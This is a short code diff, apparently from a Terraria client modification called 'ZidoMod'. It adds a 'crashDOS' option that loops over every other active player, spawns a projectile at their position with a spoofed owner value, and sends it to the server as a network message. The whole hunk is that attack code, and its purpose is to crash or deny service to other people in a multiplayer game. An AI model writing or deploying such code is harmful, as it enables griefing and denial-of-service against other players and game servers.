@@ -21141,6 +21141,18 @@
                         }
                     }
                 }
+                if (ZidoMod.crashDOS)
+                {
+                    for (int i = 0; i < Main.player.Length; i++)
+                    {
+                        if (Main.player[i].active && i != Main.myPlayer)
+                        {
+                            int projindex = Projectile.NewProjectile(Main.player[i].position.X / 16, Main.player[i].position.Y / 16, 0, 0, 23, 99, 0.0f, 0xff);
+                            if (Main.netMode == 1)
+                                NetMessage.SendData(0x1b, -1, -1, "", projindex, 0f, 0f, 0f, 0);
+                        }
+                    }
+                }
                 netPlayCounter = 0;
             }
             if (Math.IEEERemainder((double) netPlayCounter, 300.0) == 0.0)
